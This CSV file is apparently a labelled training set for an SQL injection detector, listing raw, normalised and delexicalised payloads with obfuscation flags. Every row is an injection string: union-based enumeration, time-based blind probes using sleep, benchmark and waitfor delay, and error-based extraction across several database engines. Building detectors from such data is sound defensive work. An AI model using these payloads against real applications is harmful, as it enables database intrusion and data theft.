payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd","1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'seyd' = 'seyd",<NUM><STR>seyd<STR>seyd,1,True,,sqli_dataset
"1 where 1186  =  1186 union all select null,null,null,null,null,null,null#","1 where 1186 = 1186 union all select null,null,null,null,null,null,null#","<NUM> where <NUM> = <NUM> union all select null,null,null,null,null,null,null#",1,False,,sqli_dataset
"-1816""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""dztr"" like ""dztr","-1816"" ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""dztr"" like ""dztr",-<NUM><STR>dztr<STR>dztr,1,True,,sqli_dataset
"-5425 where 5933  =  5933 union all select 5933,5933,5933--","-5425 where 5933 = 5933 union all select 5933,5933,5933--","-<NUM> where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
1'+  (  select 'jkgf' where 7487  =  7487,1'+ ( select 'jkgf' where 7487 = 7487,<NUM><STR>jkgf' where <NUM> = <NUM>,1,True,,sqli_dataset
select   (  case when   (  1082  =  6755  )   then 1082 else 1082*  (  select 1082 from mysql.db  )   end  )  #,select ( case when ( 1082 = 6755 ) then 1082 else 1082* ( select 1082 from mysql.db ) end ) #,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from mysql.db ) end ) #,1,False,,sqli_dataset
"1%"" union all select null,null,null,null,null,null,null,null,null,null#","1%"" union all select null,null,null,null,null,null,null,null,null,null#","<NUM>%"" union all select null,null,null,null,null,null,null,null,null,null#",1,False,,sqli_dataset
"-7656""   )    )     )   union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--","-7656"" ) ) ) union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--","-<NUM>"" ) ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1"" where 1809  =  1809 and make_set  (  8403  =  8403,8899  )  --","1"" where 1809 = 1809 and make_set ( 8403 = 8403,8899 ) --","<NUM>"" where <NUM> = <NUM> and make_set ( <NUM> = <NUM>,<NUM> ) --",1,False,,sqli_dataset
"1   )    )    as qzmg where 4344  =  4344 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --","1 ) ) as qzmg where 4344 = 4344 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --","<NUM> ) ) as qzmg where <NUM> = <NUM> procedure analyse ( extractvalue ( <NUM>,concat ( 0x5c, ( benchmark ( <NUM>,md5 ( 0x52515a50 ) ) ) ) ) ,<NUM> ) --",1,True,,sqli_dataset
"-5062""   )    )     )   union all select 4125,4125--","-5062"" ) ) ) union all select 4125,4125--","-<NUM>"" ) ) ) union all select <NUM>,<NUM>--",1,False,,sqli_dataset
1   )    )    as xroy where 3274  =  3274,1 ) ) as xroy where 3274 = 3274,<NUM> ) ) as xroy where <NUM> = <NUM>,1,False,,sqli_dataset
"1'  )   union all select null,null,null,null,null,null,null,null--","1' ) union all select null,null,null,null,null,null,null,null--","<NUM>' ) union all select null,null,null,null,null,null,null,null--",1,False,,sqli_dataset
"1""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""buwe""  =  ""buwe","1"" ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""buwe"" = ""buwe",<NUM><STR>buwe<STR>buwe,1,False,,sqli_dataset
"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""ssfu""  =  ""ssfu","1"" and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ""ssfu"" = ""ssfu",<NUM><STR>ssfu<STR>ssfu,1,False,,sqli_dataset
1%'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  '%'  =  ',1%' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( '%' = ',<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"iif  (  5519  =  4796,1,1/0  )","iif ( 5519 = 4796,1,1/0 )","iif ( <NUM> = <NUM>,<NUM>,<NUM>/<NUM> )",1,False,,sqli_dataset
"1""   )    )    as vhrq where 1690  =  1690 and elt  (  1210  =  1210,sleep  (  5   )    )   --","1"" ) ) as vhrq where 1690 = 1690 and elt ( 1210 = 1210,sleep ( 5 ) ) --","<NUM>"" ) ) as vhrq where <NUM> = <NUM> and elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) --",1,False,,sqli_dataset
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","call regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
"1%""   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","1%"" ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","<NUM>%"" ) ) or <NUM> = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,False,,sqli_dataset
select   (  case when   (  1726  =  4080  )   then 1726 else 1/  (  select 0  )   end  )  --,select ( case when ( 1726 = 4080 ) then 1726 else 1/ ( select 0 ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) --,1,False,,sqli_dataset
"1""  )   where 7548  =  7548","1"" ) where 7548 = 7548","<NUM>"" ) where <NUM> = <NUM>",1,False,,sqli_dataset
1'+  (  select sijr where 7250  =  7250,1'+ ( select sijr where 7250 = 7250,<NUM>'+ ( select sijr where <NUM> = <NUM>,1,True,,sqli_dataset
"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --","-1162"" ) ) as mhmh where 8710 = 8710 or make_set ( 4822 = 7598,7598 ) --","-<NUM>"" ) ) as mhmh where <NUM> = <NUM> or make_set ( <NUM> = <NUM>,<NUM> ) --",1,False,,sqli_dataset
"1   )    )     )   union all select null,null,null--","1 ) ) ) union all select null,null,null--","<NUM> ) ) ) union all select null,null,null--",1,False,,sqli_dataset
"1'   )    )    as cbka where 3176  =  3176 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","1' ) ) as cbka where 3176 = 3176 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>' ) ) as cbka where <NUM> = <NUM> and <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --",1,False,,sqli_dataset
"1""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""ksrh""  =  ""ksrh","1"" ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ""ksrh"" = ""ksrh",<NUM><STR>ksrh<STR>ksrh,1,False,,sqli_dataset
"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #","1"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #","<NUM>"" ) ) ) and ( select * from ( select ( sleep ( <NUM> ) ) ) gcrr ) #",1,False,,sqli_dataset
"-8661"" union all select 5731,5731--","-8661"" union all select 5731,5731--","-<NUM>"" union all select <NUM>,<NUM>--",1,False,,sqli_dataset
"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc","1' ) ) and make_set ( 3793 = 8118,8118 ) and ( ( 'swvc' like 'swvc",<NUM><STR>swvc<STR>swvc,1,False,,sqli_dataset
"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--","-3226'|| ( select 'ykdw' where 2617 = 2617 union all select 2617,2617--","-<NUM><STR>ykdw' where <NUM> = <NUM> union all select <NUM>,<NUM>--",1,False,,sqli_dataset
"-5513""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""ovmk"" like ""ovmk","-5513"" ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""ovmk"" like ""ovmk",-<NUM><STR>ovmk<STR>ovmk,1,False,,sqli_dataset
waitfor delay '0:0:5' and    (    (   '%'  =  ',waitfor delay '0:0:5' and ( ( '%' = ',waitfor delay <STR> and ( ( <STR> = ',1,False,,sqli_dataset
"1""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""dhss""  =  ""dhss","1"" ) and make_set ( 8403 = 8403,8899 ) and ( ""dhss"" = ""dhss",<NUM><STR>dhss<STR>dhss,1,False,,sqli_dataset
-3880  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  5194  =  5194,-3880 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 5194 = 5194,-<NUM> ) or <NUM> = ( select upper ( xmltype ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) from dual ) and ( <NUM> = <NUM>,1,False,,sqli_dataset
1'+  (  select 'qxmo' where 9511  =  9511 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1'+ ( select 'qxmo' where 9511 = 9511 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,<NUM><STR>qxmo' where <NUM> = <NUM> rlike ( select * from ( select ( sleep ( <NUM> ) ) ) vwyq ) #,1,True,,sqli_dataset
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'cuat'  =  'cuat","1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'cuat' = 'cuat",<NUM><STR>cuat<STR>cuat,1,True,,sqli_dataset
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""plqe""  =  ""plqe","( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ""plqe"" = ""plqe","( select * from ( select ( sleep ( <NUM> ) ) ) srmq ) and <STR> = ""plqe",1,False,,sqli_dataset
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null--","1%' ) ) ) union all select null,null,null,null,null,null,null,null--","<NUM>%' ) ) ) union all select null,null,null,null,null,null,null,null--",1,False,,sqli_dataset
"1'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","1' ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM>' ) ) ) or <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,False,,sqli_dataset
"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--","-7963'+ ( select 'kxzh' where 7039 = 7039 union all select 7039,7039,7039,7039,7039,7039--","-<NUM><STR>kxzh' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,True,,sqli_dataset
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )","1"" or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )","<NUM>"" or <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",1,False,,sqli_dataset
"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#","-5516'+ ( select 'bmlv' where 7188 = 7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#","-<NUM><STR>bmlv' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,True,,sqli_dataset
1 where 7055  =  7055,1 where 7055 = 7055,<NUM> where <NUM> = <NUM>,1,False,,sqli_dataset
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  ""","call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""%"" = ""","call regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) and ( ( ( <STR> = """,1,False,,sqli_dataset
"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '","-2626%' ) or elt ( 7513 = 8586,8586 ) and ( '%' = '",-<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1'||  (  select 'iwlj' where 8704  =  8704 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'","1'|| ( select 'iwlj' where 8704 = 8704 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",<NUM><STR>iwlj<STR>,1,True,,sqli_dataset
"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'vkde'  =  'vkde","1' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( 'vkde' = 'vkde",<NUM><STR>vkde<STR>vkde,1,True,,sqli_dataset
"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1 ) as zbha where 9700 = 9700 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM> ) as zbha where <NUM> = <NUM> or <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --",1,False,,sqli_dataset
"1""  )   where 5938  =  5938 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #","1"" ) where 5938 = 5938 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #","<NUM>"" ) where <NUM> = <NUM> and ( select * from ( select ( sleep ( <NUM> ) ) ) gcrr ) #",1,False,,sqli_dataset
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1 ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,<NUM> ) ) ) rlike ( select * from ( select ( sleep ( <NUM> ) ) ) vwyq ) #,1,False,,sqli_dataset
"-3868'   )    )    or make_set  (  6809  =  1236,1236  )   and    (    (   'evnj'  =  'evnj","-3868' ) ) or make_set ( 6809 = 1236,1236 ) and ( ( 'evnj' = 'evnj",-<NUM><STR>evnj<STR>evnj,1,False,,sqli_dataset
"-2365   )    )    union all select 8190,8190#","-2365 ) ) union all select 8190,8190#","-<NUM> ) ) union all select <NUM>,<NUM>#",1,False,,sqli_dataset
-2039'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ),-2039' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),-<NUM>' ) or <NUM> in ( ( char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) + ( select ( case when ( <NUM> = <NUM> ) then char ( <NUM> ) else char ( <NUM> ) end ) ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) ) ),1,True,,sqli_dataset
"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1'+ ( select pwvr where 3028 = 3028 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM><STR>abcdefg',upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --",1,True,,sqli_dataset
1'  )   where 6440  =  6440 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1' ) where 6440 = 6440 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,<NUM>' ) where <NUM> = <NUM> or ( select * from ( select ( sleep ( <NUM> ) ) ) sddo ) #,1,False,,sqli_dataset
"1""   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","1"" ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM>"" ) ) and <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,False,,sqli_dataset
"1"" where 1115  =  1115 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1"" where 1115 = 1115 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM>"" where <NUM> = <NUM> or <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --",1,False,,sqli_dataset
"1%"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  ""","1%"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""%"" = """,<NUM>%<STR>%<STR>,1,True,,sqli_dataset
"-3436  )   or elt  (  1032  =  1032,3623  )","-3436 ) or elt ( 1032 = 1032,3623 )","-<NUM> ) or elt ( <NUM> = <NUM>,<NUM> )",1,False,,sqli_dataset
"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )","1' or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )","<NUM>' or <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",1,False,,sqli_dataset
"1%'  )   union all select null,null,null,null,null--","1%' ) union all select null,null,null,null,null--","<NUM>%' ) union all select null,null,null,null,null--",1,False,,sqli_dataset
"1%'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '","1%' ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( '%' = '",<NUM>%<STR>abcdefg<STR>%<STR>,1,False,,sqli_dataset
